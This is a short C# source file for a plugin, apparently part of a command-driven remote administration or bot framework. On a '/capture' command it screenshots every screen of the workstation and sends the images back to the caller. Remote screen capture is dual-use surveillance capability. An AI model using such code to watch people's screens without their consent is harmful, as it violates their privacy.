using CapPlugin.Core;
using Contracts;
using Extensions;
using Models;
using System;
using System.ComponentModel.Composition;
using System.Drawing;
using System.Threading.Tasks;

namespace CapScrnPlugin
{
    [Export(typeof(IPlugin))]
    public class CapScrnPlugin : IPlugin
    {
        public CapScrnPlugin()
        {
            Pattern = "/capture";
            Description = "Get a screenshot of the workstation.";
            MinOSVersion = new Version(5, 0);
        }

        public override void Execute(Request req, Func<Response, Task> resp)
        {
            var api = new DesktopApi();

            api.Invoke(async (screens) =>
            {
                foreach (Bitmap screen in screens)
                {
                    var result = new Response(screen.ToMemStream());

                    await resp(result);
                }
            });
        }
    }
}
